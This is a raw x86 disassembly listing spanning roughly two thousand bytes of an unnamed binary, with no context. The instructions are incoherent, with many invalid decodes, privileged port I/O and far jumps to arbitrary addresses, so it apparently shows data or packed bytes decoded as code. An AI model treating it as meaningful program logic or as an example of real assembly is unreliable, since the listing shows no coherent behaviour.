  41ac2d:	(bad)  
  41ac2f:	cmp    DWORD PTR [ecx+0x2cce1da0],esp
  41ac35:	dec    ebp
  41ac36:	fisubr DWORD PTR [ebp-0x49]
  41ac39:	push   es
  41ac3a:	pop    DWORD PTR [edi+0x531b6f9]
  41ac40:	and    bl,BYTE PTR [ebx]
  41ac42:	jb     0x41ac70
  41ac44:	pop    ebx
  41ac45:	mov    es,WORD PTR [esi+0x5f]
  41ac48:	or     eax,0x2462d17b
  41ac4d:	push   es
  41ac4e:	jnp    0x41acc2
  41ac50:	les    edx,FWORD PTR [esi+0x9]
  41ac53:	sub    BYTE PTR [edi+ecx*2-0x43676412],ch
  41ac5a:	pop    esp
  41ac5b:	xchg   DWORD PTR [ebx-0x5e57d406],ebx
  41ac61:	test   BYTE PTR [edx+esi*8-0x7],bl
  41ac65:	cmp    DWORD PTR [eax+eax*4-0x588e9c52],esp
  41ac6c:	ret    0xef5a
  41ac6f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ac70:	xor    eax,ebx
  41ac72:	mov    bh,0x5f
  41ac74:	(bad)
  41ac77:	sub    cl,bl
  41ac79:	out    0x5c,eax
  41ac7b:	mov    BYTE PTR [eax],0x53
  41ac7e:	adc    ah,BYTE PTR [esi-0x3c]
  41ac81:	icebp  
  41ac82:	push   ds
  41ac83:	sub    edi,DWORD PTR [edi-0x159ee313]
  41ac89:	test   dh,cl
  41ac8b:	xor    dl,BYTE PTR [ebp+0x9]
  41ac8e:	out    0x17,al
  41ac90:	add    DWORD PTR [ebx+eiz*8+0x51a98229],edi
  41ac97:	dec    edi
  41ac98:	jmp    0x8208:0x51902897
  41ac9f:	pushf  
  41aca0:	ror    DWORD PTR [eax+edi*4],1
  41aca3:	and    al,ch
  41aca5:	jbe    0x41ac5b
  41aca7:	adc    eax,0xe08a9512
  41acac:	(bad)  
  41acad:	sar    BYTE PTR [ebx],0x36
  41acb0:	ins    BYTE PTR es:[edi],dx
  41acb1:	adc    al,0xd7
  41acb3:	add    bh,BYTE PTR [edi-0x3b6898f4]
  41acb9:	aad    0x6c
  41acbb:	jb     0x41ac98
  41acbd:	sub    bl,BYTE PTR [ecx-0x378dcf73]
  41acc3:	fidiv  DWORD PTR [ebp+0x64]
  41acc6:	lock shr DWORD PTR [esi],cl
  41acc9:	add    eax,0x204520ac
  41acce:	popf   
  41accf:	js     0x41ac6a
  41acd1:	mov    ecx,0x3e7c6be7
  41acd6:	inc    esp
  41acd7:	pop    eax
  41acd8:	scas   al,BYTE PTR es:[edi]
  41acd9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acda:	ss jl  0x41ad3b
  41acdd:	rcl    BYTE PTR [esi],1
  41acdf:	repnz sbb BYTE PTR [edi+edi*8],ch
  41ace3:	jecxz  0x41ac95
  41ace5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ace6:	inc    edx
  41ace7:	jbe    0x41aca9
  41ace9:	add    BYTE PTR [ecx-0x77b6698a],bh
  41acef:	jne    0x41ad29
  41acf1:	pusha  
  41acf2:	into   
  41acf3:	jae    0x41ad3a
  41acf5:	xor    al,0xdc
  41acf7:	rcr    DWORD PTR [ecx-0x57],cl
  41acfa:	dec    esi
  41acfb:	xchg   BYTE PTR [edi-0x64d35a00],ch
  41ad01:	addr16 in al,0x0
  41ad04:	cmp    esp,DWORD PTR [esi]
  41ad06:	add    bl,0x1f
  41ad09:	xchg   cl,bh
  41ad0b:	ss xchg ebp,eax
  41ad0e:	lods   al,BYTE PTR ds:[esi]
  41ad0f:	xor    al,0x7e
  41ad11:	iret   
  41ad12:	repnz inc eax
  41ad14:	stc    
  41ad15:	popa   
  41ad16:	xor    eax,0xfad4fa0f
  41ad1b:	adc    DWORD PTR [edi+ebx*1+0x12],ebp
  41ad1f:	loop   0x41ad34
  41ad21:	mov    ecx,0x86029a33
  41ad26:	xor    ecx,DWORD PTR [ebx-0x6d545286]
  41ad2c:	jp     0x41ace3
  41ad2e:	addr16 sub al,0x5d
  41ad31:	rcl    DWORD PTR [edx-0x3e],1
  41ad34:	mov    edi,0xa2f46cc4
  41ad39:	fstp   TBYTE PTR [esi-0x362c7330]
  41ad3f:	xor    edx,ebx
  41ad41:	imul   esp,ebp,0xffffffd0
  41ad44:	mov    gs,WORD PTR [esi-0x7]
  41ad47:	jge    0x41ace4
  41ad49:	mov    cl,0xf
  41ad4b:	retf   0x904e
  41ad4e:	mov    edi,DWORD PTR [ecx+edx*8+0x1ff700f6]
  41ad55:	xchg   edi,eax
  41ad56:	fimul  WORD PTR [edx-0x47]
  41ad59:	scas   eax,DWORD PTR es:[edi]
  41ad5a:	jge    0x41acde
  41ad5c:	mov    al,0x7a
  41ad5e:	test   eax,0x41df18fb
  41ad63:	shl    DWORD PTR [eiz*4-0x42bbe1f3],cl
  41ad6a:	in     al,0x6c
  41ad6c:	ror    BYTE PTR [edx+eiz*8],0x63
  41ad70:	pop    ss
  41ad71:	pop    edx
  41ad72:	fmulp  st(5),st
  41ad74:	mov    eax,ds:0xbfe3995c
  41ad79:	mov    bh,0xf4
  41ad7b:	dec    edi
  41ad7c:	inc    edi
  41ad7d:	mov    ds,WORD PTR [ebp+0x47]
  41ad80:	jl     0x41ade2
  41ad82:	cmp    esi,DWORD PTR [edi]
  41ad84:	sbb    WORD PTR [ecx],si
  41ad87:	push   edi
  41ad88:	in     eax,dx
  41ad89:	pop    ecx
  41ad8a:	(bad)  
  41ad8b:	sti    
  41ad8c:	sbb    ah,BYTE PTR [ecx+0x7a]
  41ad8f:	or     al,0x2e
  41ad91:	jno    0x41ae0a
  41ad93:	mov    ecx,0xbeb4f8b8
  41ad98:	aam    0xdb
  41ad9a:	and    edi,ecx
  41ad9c:	dec    eax
  41ad9d:	int    0xff
  41ad9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ada0:	xchg   esi,eax
  41ada1:	punpcklwd mm7,DWORD PTR [ebx-0x286b5451]
  41ada8:	cmp    eax,edi
  41adaa:	nop
  41adab:	mov    ebp,DWORD PTR [eax-0x4c]
  41adae:	lock cli 
  41adb0:	cwde   
  41adb1:	adc    bh,BYTE PTR [si-0x3c]
  41adb5:	and    ecx,ebp
  41adb7:	imul   ecx,DWORD PTR [edi+0x1c],0x3a765c6a
  41adbe:	dec    eax
  41adbf:	rcr    DWORD PTR [ebp+edi*8-0x6],cl
  41adc3:	fwait
  41adc4:	sbb    esp,edi
  41adc6:	or     bl,0x58
  41adc9:	cwde   
  41adca:	imul   BYTE PTR [eax+0xa]
  41adcd:	loopne 0x41add6
  41adcf:	nop
  41add0:	mov    eax,ds:0x4ea99d63
  41add5:	es dec eax
  41add7:	push   esi
  41add8:	xor    eax,0xf23c22c0
  41addd:	xor    al,0xd1
  41addf:	cmp    DWORD PTR [ebp-0x56],ebp
  41ade2:	xchg   ecx,eax
  41ade3:	shl    DWORD PTR [ebp-0x1c],1
  41ade6:	pop    eax
  41ade7:	inc    eax
  41ade8:	cmp    BYTE PTR [ebx],0xad
  41adeb:	add    DWORD PTR [ebx],0xc8617397
  41adf1:	retf   0x4ae9
  41adf4:	fwait
  41adf5:	mov    cl,0x4d
  41adf7:	pop    esi
  41adf8:	push   cs
  41adf9:	es adc eax,0x7d35aec6
  41adff:	add    DWORD PTR ds:0x74ebf288,0xc03a297
  41ae09:	lods   al,BYTE PTR ds:[esi]
  41ae0a:	out    0x9,al
  41ae0c:	mov    ecx,0xf4ddca74
  41ae11:	in     al,0xe0
  41ae13:	pop    edi
  41ae14:	push   esi
  41ae15:	inc    ebp
  41ae16:	cmp    eax,0xdc6d5b7a
  41ae1b:	sub    eax,0xe48cf62c
  41ae20:	clc    
  41ae21:	add    dl,BYTE PTR gs:[edx-0x3]
  41ae25:	(bad)  
  41ae26:	dec    ebx
  41ae27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ae28:	aas    
  41ae29:	dec    edi
  41ae2a:	adc    eax,0xb859eaaf
  41ae2f:	retf   0xcb1f
  41ae32:	fdivr  st,st(4)
  41ae34:	mov    ch,0x79
  41ae36:	adc    al,0x94
  41ae38:	cmp    eax,0x475310a9
  41ae3d:	xchg   ebp,eax
  41ae3e:	out    0x98,eax
  41ae40:	cli    
  41ae41:	xor    eax,0xf6b05498
  41ae46:	xor    al,0x1
  41ae48:	rol    DWORD PTR [ecx+0x1a],0xcd
  41ae4c:	mov    ds:0x231bf8ea,eax
  41ae51:	jno    0x41ae47
  41ae53:	xchg   ecx,eax
  41ae54:	cmp    al,0xbe
  41ae56:	imul   esp,DWORD PTR [esi+ecx*4+0x18],0xfffffff8
  41ae5b:	scas   al,BYTE PTR es:[edi]
  41ae5c:	push   edi
  41ae5d:	cmp    DWORD PTR [eax-0xbfc496a],esi
  41ae63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae65:	cmp    ebp,esi
  41ae67:	jbe    0x41adf1
  41ae69:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ae6a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ae6b:	(bad)  
  41ae6d:	stc    
  41ae6e:	fwait
  41ae6f:	mov    ah,0x9f
  41ae71:	lods   al,BYTE PTR ds:[esi]
  41ae72:	addr16 out dx,eax
  41ae74:	mov    eax,ds:0xdde97dd1
  41ae79:	in     al,0x7a
  41ae7b:	push   ebp
  41ae7c:	xor    ecx,DWORD PTR [edi]
  41ae7e:	mov    DWORD PTR [eax-0x65],esp
  41ae81:	je     0x41af00
  41ae83:	daa    
  41ae84:	pop    es
  41ae85:	pop    ds
  41ae86:	dec    edx
  41ae87:	xchg   edi,eax
  41ae88:	sbb    al,BYTE PTR [esi-0x6003a8fa]
  41ae8e:	pop    ss
  41ae8f:	jno    0x41aeb2
  41ae91:	push   edx
  41ae92:	test   BYTE PTR [edx-0x47f7b310],al
  41ae98:	pushf  
  41ae99:	aad    0x9e
  41ae9b:	nop
  41ae9c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae9d:	cmp    eax,0xedaa5ac7
  41aea2:	out    0x33,eax
  41aea4:	pushf  
  41aea5:	popa   
  41aea6:	xlat   BYTE PTR ds:[ebx]
  41aea7:	cli    
  41aea8:	call   0x7ff76914
  41aead:	xor    ah,BYTE PTR [eax+0x44]
  41aeb0:	xor    cl,BYTE PTR [esi]
  41aeb2:	int3   
  41aeb3:	sub    eax,0xc8137d0b
  41aeb8:	icebp  
  41aeb9:	jp     0x41ae9c
  41aebb:	imul   ebp,DWORD PTR ss:[ebx+0x67],0x671ec5c8
  41aec3:	xchg   edi,eax
  41aec4:	dec    edi
  41aec5:	aas    
  41aec6:	adc    BYTE PTR [edi-0x7e9ffde8],ch
  41aecc:	scas   al,BYTE PTR es:[edi]
  41aecd:	sbb    bh,BYTE PTR [eax]
  41aecf:	mov    WORD PTR [ebx-0x7c7a9b20],fs
  41aed5:	aas    
  41aed6:	or     BYTE PTR [eax-0x4e],bl
  41aed9:	rol    DWORD PTR [esi-0x37839e34],0x1
  41aee0:	nop
  41aee1:	les    eax,FWORD PTR [eax+0x150700c]
  41aee7:	retf   0x9c3d
  41aeea:	and    al,0xbc
  41aeec:	xor    eax,0x8463de34
  41aef1:	ret    
  41aef2:	cmp    edx,edi
  41aef4:	or     esi,DWORD PTR [esi+0x1370e5cc]
  41aefa:	mov    ah,0xaa
  41aefc:	adc    ecx,esp
  41aefe:	stos   BYTE PTR es:[edi],al
  41aeff:	mov    ?,WORD PTR [edi+0x15d08f2a]
  41af05:	call   0x825e4a99
  41af0a:	ret    
  41af0b:	je     0x41aee0
  41af0d:	mov    DWORD PTR [ebx-0x33],eax
  41af10:	jp     0x41aef6
  41af12:	add    eax,0xdf8ef48b
  41af17:	loop   0x41af62
  41af19:	enter  0xc855,0x2
  41af1d:	aad    0x7c
  41af1f:	push   bp
  41af21:	mul    esi
  41af23:	mov    dl,0x3
  41af25:	xchg   ebx,eax
  41af26:	jl     0x41af7f
  41af28:	test   al,0xfa
  41af2a:	push   edx
  41af2b:	sar    ah,1
  41af2d:	or     cl,dh
  41af2f:	mov    ds:0x5f4061cb,eax
  41af34:	in     al,0x4b
  41af36:	jp     0x41aee9
  41af38:	inc    ebp
  41af39:	std    
  41af3a:	jns    0x41afa2
  41af3c:	cmc    
  41af3d:	or     eax,edx
  41af3f:	cld    
  41af40:	xor    DWORD PTR [edx],edx
  41af42:	dec    ecx
  41af43:	idiv   dl
  41af45:	xor    al,BYTE PTR [esi+eiz*1]
  41af48:	inc    edx
  41af49:	call   0xe0f1cfa2
  41af4e:	cwde   
  41af4f:	lds    ebp,FWORD PTR [ebp+0x72]
  41af52:	dec    edi
  41af53:	or     DWORD PTR [eax],eax
  41af55:	out    dx,eax
  41af56:	outs   dx,BYTE PTR ds:[esi]
  41af57:	jecxz  0x41af55
  41af59:	shr    ebp,1
  41af5b:	ins    DWORD PTR es:[edi],dx
  41af5c:	dec    eax
  41af5d:	sahf   
  41af5e:	or     DWORD PTR [esi],edx
  41af60:	lods   eax,DWORD PTR ds:[esi]
  41af61:	loopne 0x41afa4
  41af63:	test   al,0x43
  41af65:	mov    eax,ds:0x1b7bc1cb
  41af6a:	pop    eax
  41af6b:	and    eax,0xd13f4a4a
  41af70:	stos   DWORD PTR es:[edi],eax
  41af71:	hlt    
  41af72:	xor    al,0x73
  41af74:	push   esp
  41af75:	push   esi
  41af76:	clc    
  41af77:	xor    ebp,DWORD PTR [edx+0x50]
  41af7a:	mov    ecx,0x34039904
  41af7f:	ins    BYTE PTR es:[edi],dx
  41af80:	mov    ds:0x9a45f47c,al
  41af85:	sub    eax,0x9bec7ef3
  41af8a:	xor    al,0xaa
  41af8c:	push   0xffffffd8
  41af8e:	test   al,0xe8
  41af90:	fld    TBYTE PTR [ebx-0xdd7b42a]
  41af96:	leave  
  41af97:	rol    DWORD PTR [eax+0xcbda2df],cl
  41af9d:	test   al,0xd9
  41af9f:	call   0x204fa6e5
  41afa4:	arpl   WORD PTR [ecx-0x36f75167],si
  41afaa:	aaa    
  41afab:	mov    esi,0x8ce4dc9f
  41afb0:	push   ds
  41afb1:	enter  0xab30,0xeb
  41afb5:	jmp    0xcfb9d634
  41afba:	or     DWORD PTR [ecx+0x3b96a1f7],ecx
  41afc0:	jae    0x41afae
  41afc2:	and    al,0x19
  41afc4:	mov    al,ds:0xfdf6dbf0
  41afc9:	lods   eax,DWORD PTR ds:[esi]
  41afca:	mov    eax,0x730590ea
  41afcf:	sbb    dl,BYTE PTR [esi-0x14abdd0]
  41afd5:	shl    DWORD PTR [ebp-0xc],0x27
  41afd9:	mov    ax,0xf32f
  41afdd:	leave  
  41afde:	jo     0x41af77
  41afe0:	sub    BYTE PTR [edx+0x64c5e779],cl
  41afe6:	or     eax,0xf0ca489
  41afeb:	push   esi
  41afec:	pop    es
  41afed:	push   0xc3699fec
  41aff2:	jl     0x41b02c
  41aff4:	xor    al,0xab
  41aff6:	mov    BYTE PTR [ebp+0x6f1d7bd],cl
  41affc:	sti    
  41affd:	nop
  41affe:	imul   ecx,DWORD PTR [ebx+0x36ed3fc1],0x2e2d8839
  41b008:	rcr    DWORD PTR [edi],0x8e
  41b00b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b00c:	es sub al,0xd5
  41b00f:	xor    cl,bh
  41b011:	mov    ebx,0x62b347c
  41b016:	push   ds
  41b017:	es ins DWORD PTR es:[edi],dx
  41b019:	pop    edx
  41b01a:	sub    al,0x82
  41b01c:	add    eax,DWORD PTR [edx]
  41b01e:	rol    dh,1
  41b020:	popa   
  41b021:	shl    ah,0x99
  41b024:	and    al,0xfe
  41b026:	into   
  41b027:	xor    cl,BYTE PTR [edx+ebp*4-0x11]
  41b02b:	shr    DWORD PTR [ebp+0x247343b5],cl
  41b031:	pop    edi
  41b032:	test   BYTE PTR [ecx],0x27
  41b035:	test   eax,0x43402157
  41b03a:	jp     0x773891d6
  41b040:	xor    BYTE PTR [edx+0x29b3c164],bh
  41b046:	sti    
  41b047:	cmp    eax,0x9165f958
  41b04c:	pop    ds
  41b04d:	sbb    cl,BYTE PTR [ecx]
  41b04f:	ret    
  41b050:	xchg   ebx,eax
  41b051:	jmp    0x1fad:0xa45d3708
  41b058:	ss ja  0x41b0a6
  41b05b:	lock sbb edx,0x83e43531
  41b062:	push   ebx
  41b063:	push   0xffffffb9
  41b065:	jmp    0x44dbdbfc
  41b06a:	sbb    BYTE PTR [esi+0x3e690713],dl
  41b070:	in     eax,dx
  41b071:	and    DWORD PTR [esi+0x2e],ebp
  41b074:	lods   eax,DWORD PTR ds:[esi]
  41b075:	stos   DWORD PTR es:[edi],eax
  41b076:	or     ebp,eax
  41b078:	in     eax,dx
  41b079:	hlt    
  41b07a:	xchg   edi,eax
  41b07b:	stos   DWORD PTR es:[edi],eax
  41b07c:	mov    BYTE PTR [ecx],al
  41b07e:	aaa    
  41b07f:	xchg   BYTE PTR [esi],ah
  41b081:	ret    
  41b082:	push   esp
  41b083:	or     eax,DWORD PTR [edx+0x6bcd3d8d]
  41b089:	rol    BYTE PTR [esi],0xbd
  41b08c:	repz imul ecx,DWORD PTR [ebp-0x5697327],0x22e09958
  41b097:	add    al,0x2d
  41b099:	scas   eax,DWORD PTR es:[edi]
  41b09a:	popf   
  41b09b:	adc    ecx,DWORD PTR ds:0x14d1997e
  41b0a1:	out    0xce,eax
  41b0a3:	cld    
  41b0a4:	sahf   
  41b0a5:	fs stos BYTE PTR es:[edi],al
  41b0a7:	lock js 0x41b082
  41b0aa:	pop    ss
  41b0ab:	push   ds
  41b0ac:	dec    ebx
  41b0ad:	xchg   ecx,eax
  41b0ae:	sbb    eax,0x138ea917
  41b0b3:	ja     0x41b0bf
  41b0b5:	cmp    esi,ebp
  41b0b7:	cmp    ah,ch
  41b0b9:	sahf   
  41b0ba:	adc    dh,bl
  41b0bc:	push   es
  41b0bd:	aas    
  41b0be:	dec    esi
  41b0bf:	pusha  
  41b0c0:	jo     0x41b06b
  41b0c2:	mov    ebx,0xae9544c9
  41b0c7:	in     al,0x6b
  41b0c9:	mov    ah,0x42
  41b0cb:	push   ecx
  41b0cc:	fidiv  WORD PTR [ebx+0x64]
  41b0cf:	push   ecx
  41b0d0:	out    0x8,al
  41b0d2:	not    BYTE PTR [esi]
  41b0d4:	in     eax,0x30
  41b0d6:	(bad)  
  41b0d7:	cs and al,0x5
  41b0da:	inc    di
  41b0dc:	jne    0x41b086
  41b0de:	add    bl,BYTE PTR [esi+ebx*1-0x3]
  41b0e2:	push   edi
  41b0e3:	jmp    0x18781c41
  41b0e8:	adc    DWORD PTR ds:0x8cfd9140,eax
  41b0ee:	ret    
  41b0ef:	test   al,0x6
  41b0f1:	dec    ecx
  41b0f2:	and    DWORD PTR [ecx-0x3723d236],edi
  41b0f8:	jo     0x41b0dc
  41b0fa:	pop    ebp
  41b0fb:	inc    edx
  41b0fc:	imul   esi
  41b0fe:	or     al,0xa2
  41b100:	mov    gs,WORD PTR [si]
  41b103:	jg     0x41b176
  41b105:	fcmovu st,st(2)
  41b107:	(bad)  
  41b108:	jmp    0x6baddce5
  41b10d:	mov    bl,0xf8
  41b10f:	cli    
  41b110:	xchg   DWORD PTR [ebx],esp
  41b112:	jbe    0x41b131
  41b114:	mov    ds:0x85deb6a2,eax
  41b119:	ins    BYTE PTR es:[edi],dx
  41b11a:	add    edi,DWORD PTR [esi+0x55]
  41b11d:	push   esp
  41b11e:	std    
  41b11f:	mov    bl,0x80
  41b121:	sub    BYTE PTR [eax+0x4def8790],bl
  41b127:	sbb    eax,DWORD PTR [edi+0x5c14b8b9]
  41b12d:	push   es
  41b12e:	push   ss
  41b12f:	jg     0x41b178
  41b131:	in     eax,dx
  41b132:	xor    DWORD PTR [ecx],esp
  41b134:	add    bh,ah
  41b136:	test   DWORD PTR [eax-0x2618e6c8],edi
  41b13c:	mov    ecx,DWORD PTR [edx+0x4efcaf9e]
  41b142:	xor    cl,BYTE PTR [ecx+eax*2+0x7876451a]
  41b149:	push   ds
  41b14a:	xchg   ebp,eax
  41b14b:	popa   
  41b14c:	push   ss
  41b14d:	jl     0x41b11d
  41b14f:	xchg   edi,eax
  41b150:	xor    bl,BYTE PTR [eax+0x7]
  41b153:	sub    BYTE PTR [edi+0x69],dh
  41b156:	int3   
  41b157:	retf   
  41b158:	mov    WORD PTR [ecx],fs
  41b15a:	mov    al,ds:0x690dce2a
  41b15f:	out    0xb7,al
  41b161:	imul   esp,DWORD PTR [esi],0x41
  41b164:	jle    0x41b108
  41b166:	sar    BYTE PTR [edi+0x6],0xc0
  41b16a:	adc    ah,dl
  41b16c:	in     eax,0x1
  41b16e:	nop
  41b16f:	or     DWORD PTR es:[ebp-0x400d4df7],0xffffffc3
  41b177:	mov    bl,0x5f
  41b179:	mov    ds,WORD PTR [esi-0x630fbb75]
  41b17f:	sbb    edx,edx
  41b181:	popa   
  41b182:	test   BYTE PTR [edi-0x7e],dl
  41b185:	jecxz  0x41b19f
  41b187:	xchg   esp,eax
  41b188:	xchg   ecx,eax
  41b189:	xchg   DWORD PTR [ecx-0x3d],eax
  41b18c:	mov    ebx,0x4426867c
  41b191:	fsub   QWORD PTR [ecx+0x31deef58]
  41b197:	push   esp
  41b198:	and    al,0x75
  41b19a:	test   BYTE PTR [ebx-0x755ee434],0xad
  41b1a1:	cs jecxz 0x41b125
  41b1a4:	test   DWORD PTR [esi],ebp
  41b1a6:	sbb    esp,DWORD PTR ds:0xea6ff24a
  41b1ac:	test   al,0xdf
  41b1ae:	mov    dl,0x57
  41b1b0:	mov    bh,0x1c
  41b1b2:	js     0x41b159
  41b1b4:	sbb    al,BYTE PTR [eax-0x512963c]
  41b1ba:	nop
  41b1bb:	jmp    0x1c8d:0x74490050
  41b1c2:	ja     0x41b1c5
  41b1c4:	push   edi
  41b1c5:	mov    edx,0x75f799ef
  41b1ca:	sti    
  41b1cb:	stos   BYTE PTR es:[edi],al
  41b1cc:	pusha  
  41b1cd:	pop    edi
  41b1ce:	shr    BYTE PTR gs:[esi+eiz*8+0x547baecf],cl
  41b1d6:	fist   DWORD PTR [esi+0xb9ae3e6]
  41b1dc:	pop    edi
  41b1dd:	and    bh,BYTE PTR [esi]
  41b1df:	in     al,0x8b
  41b1e1:	aam    0xf8
  41b1e3:	pop    esi
  41b1e4:	dec    edx
  41b1e5:	xchg   DWORD PTR [esi],edi
  41b1e7:	ja     0x41b220
  41b1e9:	jle    0x41b210
  41b1eb:	mov    eax,DWORD PTR [ebx]
  41b1ed:	and    BYTE PTR [eax-0x4d24be23],ah
  41b1f3:	sbb    BYTE PTR [ecx-0x6fbb0847],dh
  41b1f9:	out    dx,al
  41b1fa:	test   BYTE PTR gs:[ecx+0x21],bl
  41b1fe:	xchg   ecx,eax
  41b1ff:	mov    esp,0x10d38b26
  41b204:	mov    al,ds:0x9df65002
  41b209:	aas    
  41b20a:	lds    esi,FWORD PTR [esp+eax*2+0x62ded7de]
  41b211:	call   0x304a97e3
  41b216:	stos   DWORD PTR es:[edi],eax
  41b217:	xchg   ebx,eax
  41b218:	or     dl,BYTE PTR [edi]
  41b21a:	shl    cx,0x62
  41b21e:	add    bl,BYTE PTR [ebp+0x39]
  41b221:	lods   eax,DWORD PTR ds:[esi]
  41b222:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b223:	xor    DWORD PTR [edx+0x3b],0xff28b053
  41b22a:	fwait
  41b22b:	in     eax,0x2c
  41b22d:	test   dh,ch
  41b22f:	inc    edi
  41b230:	aaa    
  41b231:	into   
  41b232:	mov    esp,0xea144873
  41b237:	push   edx
  41b238:	jp     0x41b1bd
  41b23a:	dec    ebx
  41b23b:	jno    0x41b1f8
  41b23d:	imul   ebx
  41b23f:	sbb    al,0xa6
  41b241:	inc    ebx
  41b242:	stos   DWORD PTR es:[edi],eax
  41b243:	inc    edi
  41b244:	sahf   
  41b245:	jl     0x41b287
  41b247:	jle    0x41b260
  41b249:	sub    ch,BYTE PTR [ecx-0x45]
  41b24c:	loopne 0x41b2a4
  41b24e:	xor    al,0xf6
  41b250:	ds pop es
  41b252:	jle    0x41b22d
  41b254:	xor    BYTE PTR [ebp-0x49ffb164],bh
  41b25a:	jns    0x41b243
  41b25c:	lea    esi,[ebp+0x291147d9]
  41b262:	repz (bad) 
  41b264:	out    dx,eax
  41b265:	push   es
  41b266:	out    dx,eax
  41b267:	jb     0x41b245
  41b269:	iret   
  41b26a:	(bad)  
  41b26b:	pusha  
  41b26c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b26d:	and    bh,bh
  41b26f:	call   0x4270ce6e
  41b274:	xchg   esi,eax
  41b275:	jp     0x41b21c
  41b277:	cmp    bh,BYTE PTR [edx]
  41b279:	add    ecx,DWORD PTR [ecx]
  41b27b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b27c:	out    dx,eax
  41b27d:	mov    ch,0xae
  41b27f:	fwait
  41b280:	stc    
  41b281:	repz pop ss
  41b283:	sahf   
  41b284:	arpl   WORD PTR [ecx-0x750c3c5d],cx
  41b28a:	lea    edx,[edi]
  41b28c:	dec    esp
  41b28e:	fsubrp st(6),st
  41b290:	mov    ah,0x22
  41b292:	push   esi
  41b293:	mov    edx,0x70998c3f
  41b298:	inc    esp
  41b299:	sbb    al,0x49
  41b29b:	inc    eax
  41b29c:	retf   
  41b29d:	push   ebx
  41b29e:	ds dec ecx
  41b2a0:	inc    ecx
  41b2a1:	push   ds
  41b2a2:	stc    
  41b2a3:	xchg   ebp,eax
  41b2a4:	pop    ecx
  41b2a5:	xchg   esp,eax
  41b2a6:	stos   DWORD PTR es:[edi],eax
  41b2a7:	dec    ecx
  41b2a8:	pop    eax
  41b2a9:	jb     0x41b2d2
  41b2ab:	mov    dh,0x8e
  41b2ad:	pop    ebp
  41b2ae:	mov    bl,0x6e
  41b2b0:	cmc    
  41b2b1:	mov    ebp,0x434dbc8e
  41b2b6:	cmp    al,0x77
  41b2b8:	stc    
  41b2b9:	xlat   BYTE PTR ds:[ebx]
  41b2ba:	sub    ch,BYTE PTR [ebp+0x2]
  41b2bd:	cmp    ch,BYTE PTR [ecx+0x40]
  41b2c0:	mov    BYTE PTR [ebx-0x4c657b90],0x3a
  41b2c7:	mov    esi,0x540db903
  41b2cc:	fld    TBYTE PTR [ecx+0x235983d3]
  41b2d2:	mov    bl,0x7c
  41b2d4:	xchg   DWORD PTR [esi+0x57607405],esp
  41b2da:	jb     0x41b2ed
  41b2dc:	push   esp
  41b2dd:	push   ecx
  41b2de:	xor    BYTE PTR [ebx+0x204a063b],al
  41b2e4:	jmp    0x208d:0x94ff4aa9
  41b2eb:	hlt    
  41b2ec:	int    0x6a
  41b2ee:	ficom  WORD PTR [ebp-0x5e]
  41b2f1:	lock ds mov dh,0x22
  41b2f5:	out    dx,eax
  41b2f6:	or     edx,DWORD PTR [eax+0x5f]
  41b2f9:	aaa    
  41b2fa:	aam    0x5
  41b2fc:	mov    esp,0x1a0e71f3
  41b301:	mov    bh,0x4c
  41b303:	out    0x97,eax
  41b305:	or     ebp,ebp
  41b307:	inc    edx
  41b308:	inc    edx
  41b309:	push   es
  41b30a:	fadd   QWORD PTR [ecx]
  41b30c:	not    BYTE PTR [ecx-0xfb87a85]
  41b312:	pop    edi
  41b313:	ret    0x6e3c
  41b316:	int    0xa8
  41b318:	mov    bl,0xb
  41b31a:	xor    eax,0xcebfb47a
  41b31f:	mov    ah,0x0
  41b321:	sub    eax,0x9637c85
  41b326:	fwait
  41b327:	retf   0xbbf
  41b32a:	scas   eax,DWORD PTR es:[edi]
  41b32b:	inc    ebx
  41b32c:	pop    es
  41b32d:	xchg   esi,eax
  41b32e:	sbb    bl,BYTE PTR [eax]
  41b330:	in     al,0x47
  41b332:	fnstsw WORD PTR [ebx-0x7b]
  41b335:	cmc    
  41b336:	mov    ebx,DWORD PTR [ebp-0xf]
  41b339:	icebp  
  41b33a:	jl     0x41b321
  41b33c:	or     eax,0xbe7d6d43
  41b341:	cmp    DWORD PTR [ebp-0x560a0d73],ecx
  41b347:	or     BYTE PTR [eax],ch
  41b349:	ins    BYTE PTR es:[edi],dx
  41b34a:	(bad)  
  41b34b:	jmp    0x118a:0x8798f597
  41b352:	mov    bh,0xa8
  41b354:	xchg   edx,eax
  41b355:	xor    al,0xdb
  41b357:	psubusw mm4,QWORD PTR gs:[eax-0x713b89b0]
  41b35f:	push   ss
  41b360:	pop    eax
  41b361:	xchg   ebp,eax
  41b362:	add    eax,0xcbc74a1f
  41b367:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b368:	arpl   WORD PTR [edi+0x51],bx
  41b36b:	jl     0x41b3e2
  41b36d:	into   
  41b36e:	lods   eax,DWORD PTR ds:[esi]
  41b36f:	mov    ch,0xd7
  41b371:	inc    esp
  41b372:	push   es
  41b373:	or     ebp,DWORD PTR ds:0xec1034a2
  41b379:	scas   al,BYTE PTR es:[edi]
  41b37a:	rcl    BYTE PTR [edx],cl
  41b37c:	sub    al,0xd5
  41b37e:	mov    al,ds:0x9cb23e57
  41b383:	sbb    DWORD PTR [ecx+0x59ea185],eax
  41b389:	leave  
  41b38a:	pop    esi
  41b38b:	jno    0x41b398
  41b38d:	mov    eax,0xdcee13f5
  41b392:	outs   dx,DWORD PTR ds:[esi]
  41b393:	pushf  
  41b394:	push   0xffffff93
  41b396:	lahf   
  41b397:	fstp   TBYTE PTR [eax-0x6bf81a82]
  41b39d:	push   edx
  41b39e:	addr16 std 
  41b3a0:	inc    edx
  41b3a1:	(bad)  
  41b3a2:	clc    
  41b3a3:	xchg   ebx,eax
  41b3a4:	sub    eax,DWORD PTR [edx+0x76514f65]
